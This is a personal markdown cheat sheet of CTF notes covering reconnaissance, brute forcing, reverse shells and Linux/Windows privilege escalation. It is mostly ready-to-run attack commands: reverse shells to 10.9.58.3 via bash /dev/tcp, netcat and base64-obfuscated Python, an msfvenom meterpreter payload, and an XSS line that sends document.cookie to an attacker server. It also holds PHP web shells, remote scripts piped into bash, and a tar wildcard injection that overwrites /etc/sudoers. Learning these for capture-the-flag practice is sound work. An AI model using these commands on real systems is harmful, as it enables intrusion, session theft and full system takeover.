# My Notes for CTF's


# Reconnaissance / Info Gathering Stage


## nmap

```
ip=10.10.10.10
nmap -sC -sV $ip
```


## IF Web Server

```
gobuster dir -t 20 -x php,txt,html -w /usr/share/wordlists/dirb/common.txt -u http://$ip/ 
```

## DNS sub domains
```
wfuzz -c -f subdomains.txt -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u "http://domain.ltd/" -H "Host: FUZZ.domain.ltd" --hl 1
```
with gobuster
```
gobuster vhost -u example.com -w /usr/share/amass/wordlists/subdomains.lst | grep "Status: 200" | cut -d " " -f 2
```

## Hydra

```
hydra -I -l username -P /usr/share/wordlists/rockyou.txt 10.10.10.10 http-post-form "/:username=^USER^&password=^PASS^:F=bad username"
```

# Wordpress BruteForce

Prepare wordlist for 8 symbols
```
egrep '^.{8}$' /usr/share/wordlists/rockyou.txt > small.txt
```

```
hydra -l admin -P small.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
```
##  wpscan
```
wpscan --url http://example.com -P /usr/share/wordlists/rockyou.txt -U username.txt -t 75
```

## PHP escape

```
php://filter/convert.base64-encode/resource=index.php
```



## Windows

```
wget https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/winPEAS/winPEASbat/winPEAS.bat 
python3 -m http.server
```
```
powershell -c "Invoke-WebRequest -Uri 'http://10.9.58.3:8000/winPEAS.bat' -OutFile 'C:\Windows\Temp\winPEAS.bat'"
cd C:\Windows\Temp\
winPEAS.bat
```



## HTTP request from powershell

```
powershell -c "Invoke-WebRequest -Uri 'http://10.9.58.3:8000/shell.exe' -OutFile 'C:\Windows\Temp\shell.exe'"

```

## SSH Tunnel
```
ssh -L 6969:localhost:8080 username@remote.host
socat tcp-listen:8888,reuseaddr,fork tcp:localhost:22
```

## SMB
List shares
```
smbclient -L \\\\$ip\\
```

Connect to share
```
smbclient \\\\addres\\share -U username
```

# FTP 

```
ftp -i $ip
anonymous
binary
passive off
```


### Steal Cookies
```
# Start Web Server
python3 -m http.server

## Inject XSS On vuln Web App 
<script>window.location = 'http://10.9.58.3:8000/?param=' + document.cookie </script>
```
Usually there is web and ssh ports openned. Let's scan web directories with gobuster.

# Reverse Shell
```
bash -i >& /dev/tcp/10.9.58.3/12345 0>&1

rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.58.3 1234 >/tmp/f

mkfifo /tmp/qvfuzlx; nc 10.9.58.3 4444 0</tmp/qvfuzlx | /bin/sh >/tmp/qvfuzlx 2>&1; rm /tmp/qvfuzlx

# 12345
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC45LjU4LjMvMTIzNDUgMD4mMQo= | base64 -d | bash

bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.58.3%2F12345%200%3E%261

nc${IFS}10.9.58.3${IFS}12345${IFS}-e${IFS}/bin/sh


python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCAgICAgICAsc3VicHJvY2VzcyAgICAgICAsb3MgICAgICA7aG9zdD0iMTAuOS41OC4zIiAgICAgIDtwb3J0PTEyMzQ1ICAgICAgO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCAgICAgICAsc29ja2V0LlNPQ0tfU1RSRUFNKSAgICAgIDtzLmNvbm5lY3QoKGhvc3QgICAgICAgLHBvcnQpKSAgICAgIDtvcy5kdXAyKHMuZmlsZW5vKCkgICAgICAgLDApICAgICAgO29zLmR1cDIocy5maWxlbm8oKSAgICAgICAsMSkgICAgICA7b3MuZHVwMihzLmZpbGVubygpICAgICAgICwyKSAgICAgIDtwPXN1YnByb2Nlc3MuY2FsbCgiL2Jpbi9iYXNoIik=')[0]))"


msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.9.58.3 LPORT=9001 -f exe -o shell.exe
```

## If less 
```
(ALL) /usr/local/bin/less

echo 'bash -i >& /dev/tcp/10.9.58.3/12345 0>&1' >> /usr/local/bin/less

sudo /usr/local/bin/less
```

PHP
```
"<?php system($_GET['cmd']);?>"
"<?php exec(\"/bin/bash -c 'bash -i > /dev/tcp/10.9.58.3/12345 0>&1'\"); ?>"
```

### Upgrade the shell

```
python -c 'import pty; pty.spawn("/bin/bash")'
```

### CTRL + Z
```
stty raw -echo
fg
```
### Back to Reverse Shell

```
export TERM=xterm
```


## Reverse shell with MSF

```
use exploit/unix/webapp/wp_admin_shell_upload
```
[More reverse shells] (https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#bash-tcp
)


```
set WPCHECK false
set HttpClientTimeout 300
```


# John

```
ssh2john.py id_rsa > ssh.key
john ssh.key # or 
john ssh.key -w=/usr/share/wordlists/rockyou.txt
```
# Hashcat 


Linux shadow file
```
hashcat -m 1800 -a0 hash.txt /usr/share/wordlists/rockyou.txt  -O

```
zip file
```
fcrackzip backup.zip  -v -u -D -p /usr/share/wordlists/rockyou.txt
```


# Linux PrivEsc Insite the machine
```
curl linuxenum.savenas.lt -sL | bash
find / -type f -perm -04000 -ls 2>/dev/null
find / -regextype posix-extended -regex './(flag*|root|user)\.txt$' -exec cat {} \; 2> /dev/null
find / -name id_rsa 2> /dev/null
getcap -r / 2> /dev/null
cat /etc/crontab
sudo -l
sudo -u#-1 /bin/bash #if (ALL, !root) NOPASSWD: /bin/bash 
```

if getcaps are:

###python
```
python: exit_code = os.system(‘/bin/sh’) output = os.popen(‘/bin/sh’).read()
```

### perl
```
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
```
### tar
/bin/tar = cap_dac_read_search+ep
```
tar -cvf root.tar /root/root.txt

tar -xvf root.tar
```

## If there is a command with relative path, let's clean global variables and use own

```
echo /bin/bash > /tmp/date && chmod +x /tmp/date
export PATH=/tmp:$PATH

/tmp/bash -p
```


### Priv Escalation Using Tar in crontab set 

```
echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
echo "" > "--checkpoint-action=exec=sh privesc.sh"
echo "" > --checkpoint=1
```
Wait 1 minute for the Bash script to execute.



Docker

```
docker run  --privileged -v /root/.ssh/:/root -ti image /bin/bash
or
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

```

LXC

Download an image: 
```
lxc image import ./alpine-v3.12-i686-20200831_2036.tar.gz --alias alpine
lxc init alpine ignite -c security.privileged=true
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
cd /mnt/root/root/
```

### Post Explotation: sometimes works suggetor

```
curl https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -s | bash
```

# Dirty Cow
```
gcc -pthread dirtycow/c0w.c -o c0w
```

# SETUID

```
mkdir /tmp/1
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/1/x.c
gcc /tmp/1/x.c -o /tmp/1/x
chmod +s /tmp/1/x

```




